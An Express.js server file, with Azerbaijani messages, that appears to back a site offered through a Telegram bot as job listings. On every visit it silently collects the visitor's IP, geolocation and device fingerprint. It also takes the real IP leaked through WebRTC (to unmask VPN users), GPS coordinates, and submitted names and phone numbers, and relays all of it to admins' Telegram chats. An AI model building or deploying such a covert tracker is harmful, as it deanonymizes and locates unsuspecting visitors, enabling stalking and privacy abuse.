// server.js
const express = require('express');
const path = require('path');
const cors = require('cors');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// ================== CONFIG ==================
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_IDS = process.env.TELEGRAM_CHAT_IDS
  ? process.env.TELEGRAM_CHAT_IDS.split(',').map(id => id.trim()).filter(Boolean)
  : [];

if (!TELEGRAM_BOT_TOKEN || TELEGRAM_CHAT_IDS.length === 0) {
  console.error('❌ Telegram token və ya chat ID-lər tapılmadı!');
} else {
  console.log('✅ Telegram hazırdır');
  console.log('👥 Adminlər:', TELEGRAM_CHAT_IDS);
}

// ================== MIDDLEWARE ==================
app.use(cors());
app.use(express.json({ limit: '50mb' }));

// ================== STATISTICS STORE ==================
const stats = {
  totalVisits: 0,
  uniqueIPs: new Set(),
  uniqueVisitors: new Set(),
  byCountry: {},
  byCity: {},
  byPath: {},
  byDevice: {},
  byBrowser: {},
  byOS: {},
  byReferrer: {},
  gpsReceived: 0,
  applications: 0,
  vpnDetected: 0,
  firstVisit: null,
  lastVisit: null,
  startedAt: new Date().toISOString(),
};

const visitorSeen = new Map();
const clientReportedIPs = new Map();

// ================== HELPERS ==================
function getClientIp(req) {
  const xf = req.headers['x-forwarded-for'];
  if (xf) return xf.split(',')[0].trim();
  return req.socket?.remoteAddress || 'unknown';
}

function detectDevice(ua = '') {
  if (/tablet|ipad/i.test(ua)) return 'Tablet';
  if (/mobile|android|iphone|ipod/i.test(ua)) return 'Mobile';
  return 'Desktop';
}

function detectBrowser(ua = '') {
  if (/edg\//i.test(ua)) return 'Edge';
  if (/opr\/|opera/i.test(ua)) return 'Opera';
  if (/chrome|crios/i.test(ua)) return 'Chrome';
  if (/firefox|fxios/i.test(ua)) return 'Firefox';
  if (/safari/i.test(ua)) return 'Safari';
  return 'Other';
}

function detectBrowserVersion(ua = '') {
  let m;
  if ((m = ua.match(/edg\/([\d.]+)/i))) return m[1];
  if ((m = ua.match(/opr\/([\d.]+)/i))) return m[1];
  if ((m = ua.match(/chrome\/([\d.]+)/i))) return m[1];
  if ((m = ua.match(/firefox\/([\d.]+)/i))) return m[1];
  if ((m = ua.match(/version\/([\d.]+).*safari/i))) return m[1];
  return '';
}

function detectOS(ua = '') {
  if (/windows nt 10/i.test(ua)) return 'Windows 10/11';
  if (/windows nt 6\.3/i.test(ua)) return 'Windows 8.1';
  if (/windows nt 6\.1/i.test(ua)) return 'Windows 7';
  if (/mac os x ([\d_]+)/i.test(ua)) {
    const m = ua.match(/mac os x ([\d_]+)/i);
    return 'macOS ' + m[1].replace(/_/g, '.');
  }
  if (/android ([\d.]+)/i.test(ua)) {
    const m = ua.match(/android ([\d.]+)/i);
    return 'Android ' + m[1];
  }
  if (/iphone os ([\d_]+)/i.test(ua)) {
    const m = ua.match(/iphone os ([\d_]+)/i);
    return 'iOS ' + m[1].replace(/_/g, '.');
  }
  if (/ipad.*os ([\d_]+)/i.test(ua)) {
    const m = ua.match(/ipad.*os ([\d_]+)/i);
    return 'iPadOS ' + m[1].replace(/_/g, '.');
  }
  if (/linux/i.test(ua)) return 'Linux';
  return 'Bilinmir';
}

function detectBot(ua = '') {
  const bots = [
    'googlebot', 'bingbot', 'yandexbot', 'duckduckbot', 'baiduspider',
    'facebookexternalhit', 'twitterbot', 'applebot', 'semrushbot',
    'ahrefsbot', 'mj12bot', 'gptbot', 'chatgpt-user', 'claudebot',
    'anthropic-ai', 'ccbot', 'perplexitybot', 'bytespider', 'petalbot',
    'dotbot', 'rogerbot', 'screaming frog', 'uptimerobot', 'pingdom',
    'statuscake', 'curl', 'wget', 'python-requests', 'axios', 'node-fetch'
  ];
  const lower = ua.toLowerCase();
  for (const bot of bots) {
    if (lower.includes(bot)) {
      return bot.charAt(0).toUpperCase() + bot.slice(1);
    }
  }
  return null;
}

function topN(obj, n = 5) {
  return Object.entries(obj)
    .sort((a, b) => b[1] - a[1])
    .slice(0, n);
}

function escapeHtml(s) {
  return String(s || '')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

// ================== TELEGRAM SENDER ==================
async function sendToTelegram(text, chatIdOverride = null) {
  const targets = chatIdOverride ? [chatIdOverride] : TELEGRAM_CHAT_IDS;
  for (const chatId of targets) {
    try {
      const r = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text,
          parse_mode: 'HTML',
          disable_web_page_preview: true,
        })
      });
      if (!r.ok) {
        const err = await r.text();
        console.error('Telegram cavab xətası:', r.status, err);
      }
    } catch (e) {
      console.error('Telegram göndərmə xətası:', e.message);
    }
  }
}

// ================== GEO HELPER ==================
async function getGeoInfo(ip) {
  try {
    const cleanIp = (ip || '').replace('::ffff:', '').split(',')[0].trim();

    if (
      !cleanIp ||
      cleanIp === 'unknown' ||
      cleanIp === '127.0.0.1' ||
      cleanIp === '::1' ||
      cleanIp.startsWith('192.168.') ||
      cleanIp.startsWith('10.') ||
      cleanIp.startsWith('172.16.') ||
      cleanIp.startsWith('172.17.') ||
      cleanIp.startsWith('172.18.') ||
      cleanIp.startsWith('172.19.') ||
      cleanIp.startsWith('172.2') ||
      cleanIp.startsWith('172.30.') ||
      cleanIp.startsWith('172.31.')
    ) {
      return { country: 'Local', city: 'Local', isp: 'Local', isHosting: false, isProxy: false };
    }

    const r = await fetch(
      `http://ip-api.com/json/${cleanIp}?fields=status,country,city,isp,org,as,proxy,hosting,mobile,query`
    );
    const data = await r.json();
    if (data.status === 'success') {
      return {
        country: data.country || '?',
        city: data.city || '?',
        isp: data.isp || '?',
        org: data.org || '',
        asn: data.as || '',
        isProxy: !!data.proxy,
        isHosting: !!data.hosting,
        isMobile: !!data.mobile,
      };
    }
    return {};
  } catch (e) {
    return {};
  }
}

// ================== VISITOR MESSAGE BUILDER ==================
function buildVisitorMessage(info) {
  const {
    ip, geo, ua, path, referrer,
    clientData = {},
    botName = null,
    location = null,
  } = info;

  const lines = [];

  if (botName) {
    lines.push(`🤖 <b>BOT ZİYARƏTİ: ${escapeHtml(botName)}</b>`);
  } else {
    lines.push(`🚨 <b>YENİ ZİYARƏTÇİ</b>`);
  }
  lines.push('━━━━━━━━━━━━━━━━');

  // ==== ŞƏBƏKƏ ====
  lines.push(`🌍 <b>ŞƏBƏKƏ</b>`);
  lines.push(`🛰️ IP: <code>${escapeHtml(ip)}</code>`);
  if (geo.country && geo.country !== 'Local') {
    lines.push(`🏙️ ${escapeHtml(geo.city)}, ${escapeHtml(geo.country)}`);
    if (geo.isp) lines.push(`📡 ISP: ${escapeHtml(geo.isp)}`);
    const flags = [];
    if (geo.isProxy) flags.push('🔒 VPN/Proxy');
    if (geo.isHosting) flags.push('☁️ Hosting/Datacenter');
    if (geo.isMobile) flags.push('📶 Mobil şəbəkə');
    if (flags.length) lines.push(`⚠️ ${flags.join(' | ')}`);
  } else {
    lines.push(`📍 Lokasiya: Local / bilinmir`);
  }
  if (clientData.connection) {
    lines.push(`📶 Şəbəkə: ${escapeHtml(clientData.connection)}`);
  }

  // ==== WebRTC REAL IP ====
  if (clientData.webrtcIPs && clientData.webrtcIPs.length > 0) {
    const realIPs = clientData.webrtcIPs.join(', ');
    lines.push(`🔓 Real IP (WebRTC): <code>${escapeHtml(realIPs)}</code>`);

    const ipMatch = clientData.webrtcIPs.some(wip => wip === ip);
    if (!ipMatch) {
      lines.push(`⚠️ <b>VPN/PROXY AŞKARLANDI!</b>`);
      stats.vpnDetected++;
    }
  } else {
    lines.push(`🔓 WebRTC: bloklanıb / dəstəklənmir`);
  }
  lines.push('');

  // ==== CİHAZ ====
  lines.push(`💻 <b>CİHAZ</b>`);
  const device = clientData.device || detectDevice(ua);
  const browser = clientData.browser || detectBrowser(ua);
  const browserVer = clientData.browserVersion || detectBrowserVersion(ua);
  const os = clientData.os || detectOS(ua);

  lines.push(`📱 Növ: ${escapeHtml(device)}`);
  lines.push(`🖥️ OS: ${escapeHtml(os)}`);
  lines.push(`🌐 Brauzer: ${escapeHtml(browser)}${browserVer ? ' ' + escapeHtml(browserVer) : ''}`);

  if (clientData.screen) lines.push(`📺 Ekran: ${escapeHtml(clientData.screen)}${clientData.pixelRatio ? ` | ${escapeHtml(clientData.pixelRatio)}x` : ''}`);
  if (clientData.cpu) lines.push(`⚙️ CPU: ${escapeHtml(clientData.cpu)} nüvə`);
  if (clientData.ram) lines.push(`💾 RAM: ~${escapeHtml(clientData.ram)} GB`);
  if (clientData.gpu) lines.push(`🎮 GPU: ${escapeHtml(clientData.gpu)}`);
  lines.push('');

  // ==== SİSTEM ====
  if (clientData.language || clientData.timezone || clientData.darkMode !== undefined || clientData.battery || clientData.touch !== undefined) {
    lines.push(`🎨 <b>SİSTEM</b>`);
    if (clientData.language) lines.push(`🗣️ Dil: ${escapeHtml(clientData.language)}`);
    if (clientData.timezone) lines.push(`🕐 Saat qurşağı: ${escapeHtml(clientData.timezone)}`);
    if (clientData.darkMode !== undefined) lines.push(`🌙 Dark mode: ${clientData.darkMode ? 'Bəli' : 'Xeyr'}`);
    if (clientData.battery) lines.push(`🔋 Batareya: ${escapeHtml(clientData.battery)}`);
    if (clientData.touch !== undefined) lines.push(`👆 Toxunma: ${clientData.touch ? 'Bəli' : 'Xeyr'}`);
    lines.push('');
  }

  // ==== GPS ====
  if (location?.latitude && location?.longitude) {
    lines.push(`📍 <b>GPS</b>`);
    lines.push(`🌍 ${location.latitude}, ${location.longitude}`);
    if (location.accuracy) lines.push(`🎯 Dəqiqlik: ±${location.accuracy}m`);
    lines.push('');
  }

  // ==== GƏLİŞ ====
  lines.push(`🔗 <b>GƏLİŞ</b>`);
  lines.push(`📍 Path: ${escapeHtml(path)}`);
  if (referrer) {
    lines.push(`↩️ Referrer: ${escapeHtml(referrer)}`);
  } else {
    lines.push(`↩️ Referrer: Birbaşa`);
  }

  // ==== VISITOR ID ====
  if (clientData.visitorId) {
    const shortId = clientData.visitorId.substring(0, 12);
    lines.push(`🆔 Visitor ID: <code>${escapeHtml(shortId)}</code>`);

    const seen = visitorSeen.get(clientData.visitorId);
    if (seen) {
      const date = new Date(seen.firstSeen).toLocaleString('az-AZ');
      lines.push(`🔄 Təkrar: ${seen.count} dəfə (ilk: ${date})`);
    } else {
      lines.push(`✨ Təkrar: İlk dəfə`);
    }
  }

  lines.push('');
  lines.push(`⏰ ${new Date().toISOString()}`);
  lines.push('━━━━━━━━━━━━━━━━');

  return lines.join('\n');
}

// ================== STATS MESSAGE BUILDER ==================
function buildStatsMessage() {
  const lines = [];
  lines.push('📊 <b>STATİSTİKA</b>');
  lines.push('━━━━━━━━━━━━━━━━');
  lines.push('');
  lines.push(`👥 Ümumi ziyarət: <b>${stats.totalVisits}</b>`);
  lines.push(`🆔 Unikal IP: <b>${stats.uniqueIPs.size}</b>`);
  lines.push(`👤 Unikal ziyarətçi: <b>${stats.uniqueVisitors.size}</b>`);
  lines.push(`📍 GPS alındı: <b>${stats.gpsReceived}</b>`);
  lines.push(`📝 Müraciət: <b>${stats.applications}</b>`);
  lines.push(`🔒 VPN aşkarlandı: <b>${stats.vpnDetected}</b>`);
  lines.push('');

  const countries = topN(stats.byCountry, 5);
  if (countries.length) {
    lines.push('🌍 <b>Top ölkələr:</b>');
    countries.forEach(([k, v]) => lines.push(`   • ${escapeHtml(k)}: ${v}`));
    lines.push('');
  }

  const cities = topN(stats.byCity, 5);
  if (cities.length) {
    lines.push('🏙️ <b>Top şəhərlər:</b>');
    cities.forEach(([k, v]) => lines.push(`   • ${escapeHtml(k)}: ${v}`));
    lines.push('');
  }

  const devices = topN(stats.byDevice, 3);
  if (devices.length) {
    lines.push('📱 <b>Cihazlar:</b>');
    devices.forEach(([k, v]) => lines.push(`   • ${escapeHtml(k)}: ${v}`));
    lines.push('');
  }

  const oses = topN(stats.byOS, 5);
  if (oses.length) {
    lines.push('🖥️ <b>OS:</b>');
    oses.forEach(([k, v]) => lines.push(`   • ${escapeHtml(k)}: ${v}`));
    lines.push('');
  }

  const browsers = topN(stats.byBrowser, 3);
  if (browsers.length) {
    lines.push('🌐 <b>Brauzerlər:</b>');
    browsers.forEach(([k, v]) => lines.push(`   • ${escapeHtml(k)}: ${v}`));
    lines.push('');
  }

  const referrers = topN(stats.byReferrer, 5);
  if (referrers.length) {
    lines.push('↩️ <b>Gəliş mənbələri:</b>');
    referrers.forEach(([k, v]) => lines.push(`   • ${escapeHtml(k)}: ${v}`));
    lines.push('');
  }

  lines.push(`⏰ Son ziyarət: ${stats.lastVisit || '-'}`);
  lines.push(`🚀 Başlama: ${stats.startedAt}`);

  return lines.join('\n');
}

// ================== GLOBAL VISITOR LOGGER ==================
const loggedIPs = new Map();
const LOG_COOLDOWN_MS = 30000;

app.use(async (req, res, next) => {
  try {
    const isPageRequest =
      req.method === 'GET' &&
      !req.path.startsWith('/api/') &&
      !req.path.startsWith('/webhook/') &&
      !req.path.match(/\.(css|js|png|jpg|jpeg|gif|svg|ico|woff|woff2|ttf|map|json|xml|txt)$/i);

    if (isPageRequest) {
      const ip = getClientIp(req);
      const now = Date.now();
      const ua = req.headers['user-agent'] || '';
      const referrer = req.headers['referer'] || req.headers['referrer'] || '';
      const lastSeen = loggedIPs.get(ip);

      stats.totalVisits++;
      stats.uniqueIPs.add(ip);
      stats.byPath[req.path] = (stats.byPath[req.path] || 0) + 1;

      const device = detectDevice(ua);
      const browser = detectBrowser(ua);
      const os = detectOS(ua);
      stats.byDevice[device] = (stats.byDevice[device] || 0) + 1;
      stats.byBrowser[browser] = (stats.byBrowser[browser] || 0) + 1;
      stats.byOS[os] = (stats.byOS[os] || 0) + 1;

      let refLabel = 'Birbaşa';
      if (referrer) {
        try { refLabel = new URL(referrer).hostname; }
        catch { refLabel = referrer.substring(0, 50); }
      }
      stats.byReferrer[refLabel] = (stats.byReferrer[refLabel] || 0) + 1;

      if (!stats.firstVisit) stats.firstVisit = new Date().toISOString();
      stats.lastVisit = new Date().toISOString();

      if (!lastSeen || (now - lastSeen) > LOG_COOLDOWN_MS) {
        loggedIPs.set(ip, now);

        setTimeout(async () => {
          const clientTime = clientReportedIPs.get(ip);
          if (clientTime && (Date.now() - clientTime) < 60000) {
            return;
          }

          const geo = await getGeoInfo(ip);
          const botName = detectBot(ua);

          if (geo.country && geo.country !== 'Local') {
            stats.byCountry[geo.country] = (stats.byCountry[geo.country] || 0) + 1;
            if (geo.city) stats.byCity[geo.city] = (stats.byCity[geo.city] || 0) + 1;
          }

          const msg = buildVisitorMessage({
            ip, geo, ua,
            path: req.path,
            referrer: refLabel !== 'Birbaşa' ? refLabel : '',
            clientData: {},
            botName,
          });

          await sendToTelegram(msg);
        }, 8000);
      }
    }
  } catch (e) {
    console.error('Visitor logger xətası:', e.message);
  }
  next();
});

app.use(express.static(path.join(__dirname, 'public')));

// ================== API ==================
app.post('/api/send-data', async (req, res) => {
  try {
    const {
      videoUrl, location, action, name, phone,
      fingerprint,
      visitorId,
    } = req.body || {};

    const ip = getClientIp(req);
    const ua = req.headers['user-agent'] || '';
    const referrer = req.headers['referer'] || req.headers['referrer'] || '';

    if (action === 'fingerprint') {
      clientReportedIPs.set(ip, Date.now());
    }

    if (location?.latitude && location?.longitude) {
      stats.gpsReceived++;
    }
    if (action === 'apply') {
      stats.applications++;
    }

    if (visitorId) {
      stats.uniqueVisitors.add(visitorId);
      const seen = visitorSeen.get(visitorId);
      if (seen) {
        seen.count++;
        seen.lastSeen = Date.now();
        seen.ip = ip;
      } else {
        visitorSeen.set(visitorId, {
          firstSeen: Date.now(),
          lastSeen: Date.now(),
          count: 1,
          ip,
        });
      }
    }

    const geo = await getGeoInfo(ip);

    if (action === 'fingerprint') {
      if (geo.country && geo.country !== 'Local') {
        stats.byCountry[geo.country] = (stats.byCountry[geo.country] || 0) + 1;
        if (geo.city) stats.byCity[geo.city] = (stats.byCity[geo.city] || 0) + 1;
      }

      let refLabel = '';
      if (referrer) {
        try { refLabel = new URL(referrer).hostname; }
        catch { refLabel = referrer.substring(0, 60); }
      }

      const msg = buildVisitorMessage({
        ip,
        geo,
        ua,
        path: '/',
        referrer: refLabel,
        clientData: fingerprint || {},
        botName: detectBot(ua),
        location: location || null,
      });

      await sendToTelegram(msg);
      return res.json({ ok: true });
    }

    if (action === 'apply') {
      let msg = `📝 <b>YENİ MÜRACİƏT</b>\n`;
      msg += `━━━━━━━━━━━━━━━━\n`;
      msg += `👤 Ad: ${escapeHtml(name || 'yox')}\n`;
      msg += `📞 Telefon: ${escapeHtml(phone || 'yox')}\n`;
      msg += `🛰️ IP: <code>${escapeHtml(ip)}</code>\n`;
      if (geo.country && geo.country !== 'Local') {
        msg += `🌍 ${escapeHtml(geo.city)}, ${escapeHtml(geo.country)}\n`;
      }
      if (location?.latitude && location?.longitude) {
        msg += `📍 GPS: ${location.latitude}, ${location.longitude}\n`;
      }
      if (visitorId) {
        msg += `🆔 Visitor: <code>${escapeHtml(visitorId.substring(0, 12))}</code>\n`;
      }
      msg += `⏰ ${new Date().toISOString()}`;
      await sendToTelegram(msg);
      return res.json({ ok: true });
    }

    let message = `🛰️ IP: <code>${escapeHtml(ip)}</code>\n`;
    if (action) message += `🧩 Action: ${escapeHtml(action)}\n`;
    if (videoUrl) message += `📹 Video: ${escapeHtml(videoUrl)}\n`;
    if (location?.latitude) {
      message += `📍 GPS: ${location.latitude}, ${location.longitude}\n`;
    }
    await sendToTelegram(message.trim());
    res.json({ ok: true });

  } catch (err) {
    console.error('❌ API xətası:', err);
    res.status(500).json({ ok: false });
  }
});

// ================== TELEGRAM WEBHOOK ==================
app.post(`/webhook/${TELEGRAM_BOT_TOKEN}`, async (req, res) => {
  try {
    const msg = req.body.message;
    if (!msg || !msg.text) return res.sendStatus(200);

    const text = msg.text.trim();
    const fromChatId = msg.chat?.id;
    const isAdmin = TELEGRAM_CHAT_IDS.includes(String(fromChatId));

    if (text === '/start') {
      await sendToTelegram(
        `👋 Xoş gəldiniz!\n` +
        `📌 İş elanları: https://video-analyzer-server.onrender.com\n\n` +
        `ℹ️ /about\n` +
        `📊 /stats (admin)`,
        fromChatId
      );
    }
    else if (text === '/about') {
      await sendToTelegram(
        `ℹ️ Bu sistem test və daxili istifadə üçündür.\nDaxil edilən məlumatlar adminə bildirilir.`,
        fromChatId
      );
    }
    else if (text === '/link') {
      await sendToTelegram(`🔗 https://video-analyzer-server.onrender.com`, fromChatId);
    }
    else if (text === '/stats') {
      if (!isAdmin) {
        await sendToTelegram('⛔ Bu əmr yalnız adminlər üçündür.', fromChatId);
      } else {
        await sendToTelegram(buildStatsMessage(), fromChatId);
      }
    }
    else if (text === '/reset_stats') {
      if (!isAdmin) {
        await sendToTelegram('⛔ Bu əmr yalnız adminlər üçündür.', fromChatId);
      } else {
        stats.totalVisits = 0;
        stats.uniqueIPs.clear();
        stats.uniqueVisitors.clear();
        stats.byCountry = {};
        stats.byCity = {};
        stats.byPath = {};
        stats.byDevice = {};
        stats.byBrowser = {};
        stats.byOS = {};
        stats.byReferrer = {};
        stats.gpsReceived = 0;
        stats.applications = 0;
        stats.vpnDetected = 0;
        stats.firstVisit = null;
        stats.lastVisit = null;
        stats.startedAt = new Date().toISOString();
        visitorSeen.clear();
        loggedIPs.clear();
        clientReportedIPs.clear();
        await sendToTelegram('✅ Statistika sıfırlandı.', fromChatId);
      }
    }

    res.sendStatus(200);
  } catch (e) {
    console.error('Webhook xətası:', e);
    res.sendStatus(200);
  }
});

// ================== FRONTEND ==================
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ================== START ==================
app.listen(PORT, () => {
  console.log(`🚀 Server ${PORT} portunda işləyir`);
});
